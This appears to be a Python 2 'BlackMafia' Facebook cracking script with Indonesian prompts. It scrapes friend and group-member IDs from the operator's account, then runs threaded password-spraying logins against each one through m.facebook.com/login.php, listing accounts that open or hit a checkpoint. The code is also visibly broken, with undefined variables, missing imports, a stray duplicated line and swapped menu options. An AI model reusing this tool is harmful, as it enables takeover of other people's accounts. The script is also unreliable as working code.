#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

#Dev:love_hacker
##### LOGO #####
logo = """
\033[1;96m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
\033[1;96m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
\033[1;96m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
\033[1;96m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
\033[1;96m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
\033[1;96m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[1;96m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
\033[1;96m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
\033[1;96m██╔████╔██║███████║█████╗░░██║███████║
\033[1;96m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
\033[1;96m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
                      _____ 
            ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
      ¸.· ´::::::´: . · .¨             ::` ·.¸ 
   ¸·´,;':::::::' :· .     ·   .  :      ::::::`·¸ 
 ¸·;;;;'::::::: · . :'      ·    .     .  :::::::::·¸ 
,;;;;;;:::::::.:. ·         ·     :       :::::::::::.   
;;;;;;;;::::::..· :´  .       '     ·     .:::::::::::::                                        
';;;;;;;;,:::'::·.......¸.·::·.¸.......::::::::::::::::: 
 ';;;;;;;;;;;;;;,,¸:::::::::;::::::::::::::::::::::::::' 
'  ';.¸.-·~·-.,¸;;;;;;,:::´`:::::::::::¸,.-·~·-.¸.::' 
    ;;`·.¸      ¯¨*·.¸';;.'::::.¸.·*¨¯       ¸.·´:: 
    ';;:::'`·.¸●       ')`:::::(     ●   ¸.·´::: 
     `·.::::::`·--·´ :::::: `·-·´ .::::·´::: 
         `·,;;:::.  :·:´ø· ø `. ::. ' ·.:::·´ 
            `·-.:::.·: ::.:.: · : :::::.-·´ 
               '`·.::.·-~ .::·´::::: 
                 )`·.:.  : . ·.::·´( 
                /',; '`··´  :.'\ 
   _¸.·´,;;;             .:::.`·.¸_ 
.·´   |`:¯'`: |`:¯`:    |`:¯'`: |`·.¯¯¯¯`·´¯('|`:¯`·.  |`:¯: 
    .·´ .·´|`·.`:   :    `':   :  `·.`·.`·.¯`·.·´|'`: :`·.`·.
.·´  .·´__|   `·. :      |`·. `·.  `·. )  `>|.·'  : :`·.`·.`'
:    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.:  : 
|`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_.| 
`·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
   |___'|.·´    lovehacker BlackMafia     -«
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
\033[1;96m:•◈•╔╗─────────╔╗───────╔╗
\033[1;96m:•◈•║║─────────║║───────║║
\033[1;96m:•◈•║║╔══╦╗╔╦══╣╚═╦══╦══╣║╔╦══╦═╗
\033[1;96m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   
\033[1;96m:•◈•║╚╣╚╝╠╗╔╣║═╣║║║╔╗║╚═╣╔╗╣║═╣║    
\033[1;96m:•◈•╚═╩══╝╚╝╚══╩╝╚╩╝╚╩══╩╝╚╩══╩╝
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;96m╔══╗╔╗──────╔╗─╔═╗╔═╗───╔═╗
\033[1;96m║╔╗║║║──────║║─║║╚╝║║───║╔╝
\033[1;96m║╚╝╚╣║╔══╦══╣║╔╣╔╗╔╗╠══╦╝╚╦╦══╗
\033[1;96m║╔═╗║║║╔╗║╔═╣╚╝╣║║║║║╔╗╠╗╔╬╣╔╗║
\033[1;96m║╚═╝║╚╣╔╗║╚═╣╔╗╣║║║║║╔╗║║║║║╔╗║
\033[1;96m╚═══╩═╩╝╚╩══╩╝╚╩╝╚╝╚╩╝╚╝╚╝╚╩╝╚╝
\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBlackMafia\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
jalan("\033[1;96m----------------------//\\")
jalan("\033[1;96m---------------------// ¤ \\")
jalan("\033[1;96m---------------------\\ ¤ //")
jalan("\033[1;96m---------------------- \\//")
jalan("\033[1;96m-------------------- (___)")
jalan("\033[1;96m---------------------(___)")
jalan("\033[1;96m---------------------(___)")
jalan("\033[1;96m---------------------(___)_________")
jalan("\033[1;96m--------\_____/\__/----\__/\_____/")
jalan("\033[1;96m------------\ _°_[------------]_ _° /")
jalan("\033[1;96m----------------\_°_¤ ---- ¤_°_/")
jalan("\033[1;96m--------------------\ __°__ /")
jalan("\033[1;96m---------------------|\_°_/|")
jalan("\033[1;96m---------------------[|\_/|]")
jalan("\033[1;96m---------------------[|[¤]|]")
jalan("\033[1;96m---------------------[|;¤;|]")
jalan("\033[1;96m---------------------[;;¤;[]")
jalan("\033[1;96m--------------------;;;;¤][]\ ")
jalan("\033[1;96m-------------------;;;;;¤][]-\ ")
jalan("\033[1;96m------------------;;;;;[¤][]--\ ")
jalan("\033[1;96m-----------------;;;;;|[¤][]---\ ")
jalan("\033[1;96m----------------;;;;;[|[¤][]|---| ")
jalan("\033[1;96m---------------;;;;;[|[¤]|]|---| ")
jalan("\033[1;96m----------------;;;;[|[¤]|/---/ ")
jalan("\033[1;96m-----------------;;;[|[¤]/---/ ")
jalan("\033[1;96m------------------;;[|[¤/---/ ")
jalan("\033[1;96m-------------------;[|[/---/ ")
jalan("\033[1;96m--------------------[|/---/ ")
jalan("\033[1;96m---------------------/---/ ")
jalan("\033[1;96m--------------------/---/|] ")
jalan("\033[1;96m-------------------/---/]|];")
jalan("\033[1;96m------------------/---/¤]|];;")
jalan("\033[1;96m-----------------|---|[¤]|];;;")
jalan("\033[1;96m-----------------|---|[¤]|];;;")
jalan("\033[1;96m------------------\--|[¤]|];;")
jalan("\033[1;96m-------------------\-|[¤]|]; ")
jalan("\033[1;96m---------------------\|[¤]|] ")
jalan("\033[1;96m----------------------\\¤// ")
jalan("\033[1;96m-----------------------\|/ ")
jalan("\033[1;96m------------------------V ")                                     
jalan("\033[1;96m------------------------------------")
jalan("\033[1;96m╭━━━╮╱╱╱╱╱╭╮╱╱╱╱╭━╮╭━╮")
jalan("\033[1;96m┃╭━╮┃╱╱╱╱╱┃┃╱╱╱╱┃┃╰╯┃┃")
jalan("\033[1;96m┃╰━━┳━━┳┳━╯┣━━┳━┫╭╮╭╮┣━━┳━╮")
jalan("\033[1;96m╰━━╮┃╭╮┣┫╭╮┃┃━┫╭┫┃┃┃┃┃╭╮┃╭╮╮")
jalan("\033[1;96m┃╰━╯┃╰╯┃┃╰╯┃┃━┫┃┃┃┃┃┃┃╭╮┃┃┃┃")
jalan("\033[1;96m╰━━━┫╭━┻┻━━┻━━┻╯╰╯╰╯╰┻╯╰┻╯╰╯")
jalan("\033[1;96m╱╱╱╱┃┃")
jalan("\033[1;96m╱╱╱╱╰╯")
jalan('\033[1;93m              Welcome to BlackMafia')
print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "SpiderMan"
CorrectPassword = "lovehacker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;96mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;96mTool Password \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def printf(x,e=0):
        f = 'mhkbpcP'
        for o in f:
                j = f.index(o)
                x = x.replace('!%s'%o,'\x1b[%s;1m'%str(31+j))
        x += '\x1b[0m'
        x = x.replace('!0','\x1b[0m')
        if e != 0:
                sys.stdout.write(x)
        else:
                sys.stdout.write(x+'\n')
if platform.python_version().split('.')[0] != '2':
        printf('[!] Kamu menggunakan Python versi %s mohon gunakan Python versi 2.x.x'%v().split(' ')[0])
        sys.exit(1)
try:

  import mechanize
except ImportError:
        printf('[!] Sepertinya modul Mechanize belum terinstall,\n[!] pip2 install mechanize')
        sys.exit(1)
br = 0
log = 0
id_bfriend = []
id_bgroups = []
fid_bfriend = []
fid_bgroups = []

class pesbuk(threading.Thread):
        def __init__(self,x,f):
                threading.Thread.__init__(self)
                self.id = x
                self.o = 0
                self.f = f
        def update(self):
                return self.o,self.id
        def run(self):
                try:
                        data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.f}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36'}))
                except KeyboardInterrupt:
                        sys.exit(1)
                except:
                        self.o = 4
                        sys.exit(1)
                if 'm_sess' in data.url or 'save-device' in data.url:
                        self.o = 1
                elif 'checkpoint' in data.url:
                        self.o = 2
                else:
                        self.o = 3
def loads():
    x = [
     '.   ', '..  ', '... ']
    for o in x:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' + o,
        sys.stdout.flush()
        time.sleep(1)

def crack(o):
        while 1:
                x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mSandi')
                if len(x) < 6:
                        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mMasukan Minimal 6 Huruf')
                else:
                        break
        return crack_pb(o,x)

def display(account,passw,data):
        checkpoint = []
        false = 0
        works = []
        for x in account:
                o,id = x
                if o == 1:
                        works.append(id)
                elif o == 2:
                        checkpoint.append(id)
                elif o == 3:
                        wrongs += 1
        print('\x1b[0m[\x1b[92;1m+\x1b[0m] Berhasil \x1b[77;1m%d \x1b[0m'%len(works))
        if len(works) != 0:
                for x in works:
                        print('\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1m%s => \x1b[0m[%s]'%(x,passw))
        print('\x1b[0m[\x1b[93;1m*\x1b[0m] Cekpoint \x1b[77;1m%d \x1b[0m'%len(checkpoint))
        if len(checkpoint) != 0:
                for x in checkpoint:
                        print('\n\x1b[0m[\x1b[93;1m#\x1b[0m] \x1b[77;1m%s => \x1b[0m[%s]'%(x,passw))
        print('\x1b[0m[\x1b[91;1m-\x1b[0m] \x1b[77;1mGagal    \x1b[0m'+str(false))
        x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mMulai ulang lagi [Y/n]',['Y','N'])
        if x.upper() == 'Y':
                return crack(data)
        else:
                return menu()

def crack_pb(data,passw):
        account = []
        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mMengcrack \x1b[0m%d \x1b[77;1mAkun dengan sandi \x1b[0m[%s]'%(len(data),passw))
        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mCracking ...\x1b[0m%',1)
        sys.stdout.flush()
        count0,count1 = 0,0
        f = []
        for o in data:
                o = o.replace(' ','')
                o = o.replace('\n','')
                if len(o) != 0:f.append(pesbuk(x,passw))
                count1 += 1
        for o in f:
                o.daemon = True
                try:o.start()
                except KeyboardInterrupt:exit()
        h_error = []
        error = 0
        while 1:
                try:
                        for o in f:
                                status,id = o.update()
                                if status != 0:
                                        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCracking ... \x1b[0m%d %s '%(int(float((float(count0)/float(count1))*100)),'%'),1)
                                        sys.stdout.flush()
                                        del(f[f.index(o)])
                                        if status == 4:
                                                h_error.append(id)
                                                if h_error.count(id) == 3:
                                                        pass
                                                else:
                                                        f.append(pesbuk(id,passw))
                                                        f[len(f)-1].daemon = True
                                                        f[len(f)-1].start()
                                        else:
                                                count0 += 1
                                                account.append((status,id))
                except KeyboardInterrupt:
                        exit()
                try:
                        if threading.activeCount() == 1:break
                except KeyboardInterrupt:
                        exit()
        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCracking ... 100%      ')
        display(account,passw,data)

def browser():
        global br
        reload(sys)
        sys.setdefaultencoding('utf8')
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_cookiejar(cookielib.LWPCookieJar())
        br.set_handle_redirect(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
        br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36')]
')]

def datacount():
        global fid_bgroups,fid_bfriend
        try:
                fid_bgroups = open(os.sys.path[0]+'/MBFgroups.txt','r').readlines()
        except:pass
        try:
                fid_bfriend = open(os.sys.path[0]+'/MBFfriend.txt','r').readlines()
        except:pass

def saved():
        if len(id_bgroups) != 0:
                print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan daftar Grup')
                try:
                        open(os.sys.path[0]+'/MBFgroups.txt','w').write('\n'.join(id_bgroups))
                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mMenyimpan berhasil MBFgroups.txt')
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMenyimpan gagal')
        if len(id_bfriend) != 0:
                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSimpan daftar Teman')
                try:
                        open(os.sys.path[0]+'/MBFfriend.txt','w').write('\n'.join(id_bfriend))
                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mMenyimpan berhasil MBFfriend.txt')
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1Menyimpan gagal')

def exit():
        saved()
        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKeluar dari program!\n')
        sys.exit(1)

def input_one(o,f=0):
        while 1:
                try:
                        x = raw_input('\x1b[0m%s: \x1b[77;1m'%o)
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGagal')
                        exit()
                if f:
                        if x.upper() in f:
                                break
                        else:
                                print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mTekan Enter opsi')
                                continue
                else:
                        if len(x) == 0:
                                print('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mTidak boleh kosong')
                                continue
                        else:
                                break
        return x

def input_two(i,x):
        while 1:
                try:
                        o = int(input_one(i))
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan salah')
                        continue
                if o in x:
                        break
                else:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan salah')
        return o

def next_one():
        global fid_bgroups
        if len(fid_bgroups) != 0:
                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mResetar daftar Grup anda \x1b[0m[R/L]',['R','L'])
                if x.upper() == 'L':
                        return crack(fid_bgroups)
                else:
                        os.remove(os.sys.path[0]+'/MBFgroups.txt')
                        fid_bgroups = []
        return 0

def next_two():
        global fid_bfriend
        if len(fid_bfriend) != 0:
                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mRestar daftar Teman anda [R/L]',['R','L'])
                if x.upper() == 'L':
                        return crack(fid_bfriend)
                else:
                        os.remove(os.sys.path[0]+'/MBFtriend.txt')
                        fid_bfriend = []
        return 0

def open_pb(o):
        try:
                x = br.open(o)
                br._factory.is_html = True
                x = x.read()
        except:
                print('\n\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mGagal Membuka \x1b[0m' +str(o))
                exit()
        if '<link rel="redirect" href="' in x:
                return open_pb(br.find_link().url)
        else:
                return x

def login():
        global log
        username = input_one('\x1b[0m[\x1b[92;1m+\x1b[0m] Email')
        password = input_one('\x1b[0m[\x1b[93;1m*\x1b[0m] Sandi')
        loads()
        open_pb('https://m.facebook.com')
        br.select_form(nr=0)
        br.form['email']=username
        br.form['pass']=password
        br.submit()
        url = br.geturl()
        if 'save-device' in url or 'm_sess' in url:
                open_pb('https://mobile.facebook.com/home.php')
                name = br.find_link(url_regex='logout.php').text
                name = re.findall(r'\((.*a?)\)',name)[0]
                os.system('xdg-open https://github.com/thedarksec/')
                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelamat datang %s'%name)
                print('\x1b[0m[\x1b[96;1m*\x1b[0m] \x1b[77;1mSemoga hari ini anda beruntung')
                log = 1
        elif 'checkpoint' in url:
                print('\n\x1b[0m[\x1b[95;1m#\x1b[0m] \x1b[77;1mAkun kena Cekpoint\n\x1b[0m[\x1b[96;1m$\x1b[0m] \x1b[77;1mCoba masuk menggunakan Opera Mini')
                exit()
        else:
                print('\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mMasuk Gagal')

def idgroups():
        if log != 1:
                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mMasuk Akun Facebook Anda \x1b[0m[\x1b[91;1m/\x1b[0m]')
                login()
                if log == 0:
                        exit()
        next = cracks_id_groups0()
        while 1:
                cracks_id_groups1(open_pb(next))
                try:
                        next = br.find_link(url_regex='/browse/group/members/').url
                except:
                        print('\n\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mJumalh ID Grup sekarang \x1b[0m%d id'%len(id_bgroups))
                        break
        saved()
        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mMulai mengcrack sekarang \x1b[0m[Y/n]',['Y','N'])
        if x.upper() == 'Y':
                return crack(id_bgroups)
        else:
                return menu()

def cracks_id_friend(r):
        for o in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
                id_bfriend.append(o)

def idfriend():
        if log != 1:
                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mMasuk Akun Facebook Anda \x1b[0m[\x1b[91;1m/\x1b[0m]')
                login()
                if log == 0:
                        exit()
        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mMengumpulkan ID Teman')
        open_pb('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
        counts = br.find_link(url_regex='/friends/center/friends/').text
        counts = re.findall(r'\((.*a?)\)',counts)[0]
        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mJumalah \x1b[0m%s \x1b[77;1mID Teman \x1b[0m'%counts)
        cracks_id_friend(open_pb('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
        try:
                next = br.find_link(url_regex='friends_center_main').url
        except:
                if len(id_friend) != 0:
                        print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mJumlah ID Teman Sekarang \x1b[0m%d id'%len(id_friend))
                else:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKembali')
                        exit()
        while 1:
                cracks_id_friend(open_pb(next))
                print('\n\x1b[0m[\x1b[96;1m+\x1b[0m] m%s \x1b[77;1mJumlah semua ID \x1b[0m'%len(id_bfriend),1)
                sys.stdout.flush()
                try:
                        next = br.find_link(url_regex='friends_center_main').url
                except:
                        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mJumlah ID Teaman sekarang \x1b[0m%d id'%len(id_bfriend))
                        break
        saved()
        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mMulai mengcrack sekarang \x1b[0m[Y/n]',['Y','N'])
        if x.upper() == 'Y':
                return crack(id_bfriend)
        else:
                return menu()
def menu():
        print("\n\n\033[0m[\033[94;1m1\033[0m] Crack dari Grup")
        print("\033[0m[\033[92;1m2\033[0m] Crack dari Teman")
        print("\033[0m[\033[91;1m3\033[0m] Keluar")
        x = input_two('\n\x1b[0m[\x1b[93;1m-\x1b[0m] \x1b[77;1mMasukan Opsi\x1b[0m',[1,2,3])
        if x == 2:
                next_one()
                idgroups()
        elif x == 1:
                next_two()
                idfriend()
        elif x == 3:
                print ("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!\n")
                sleep(1)
                sys.exit(1)

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

os.system('clear')
os.system('reset')
sleep(1)
print
print(logo)
print
print("\033[0m[\033[1;96;2m1\033[0m] \033[1;77mFacebook Multiface")
print
print("\033[0m[\033[93;1m&\033[0m] LISENSI")
print("\033[0m[\033[94;1m#\033[0m] Informasi")
print("\033[0m[\033[92;1m*\033[0m] Perbarui")
print("\033[0m[\033[91;1m-\033[0m] Keluar")
print
option = raw_input("\033[0m(\033[105;77;1m/\033[0m) \033[1;77mMasukan opsi: \033[0m")
if option.strip() in '1 gunakan'.split():
    menu()
elif option.strip() in '& 2 lisensi'.split():
    print
    os.system('nano LICENSE')
    print
    restart()
elif option.strip() in '# 3 info'.split():
    os.system('clear')
    print(example)
    os.system('toilet -f smslant Multi')
    print(info)
    sleep(1)
    print
    raw_input('[ Tekan Enter ]')
    restart()
elif option.strip() in '* 4 perbarui'.split():
    print
    os.system('git pull origin master')
    print
    raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
    restart()
elif option.strip() in '- keluar 0'.split():
    print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
    print
    sys.exit(1)
else:
    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
    print
    sleep(1)
    restart()

datacount()
browser()
menu()
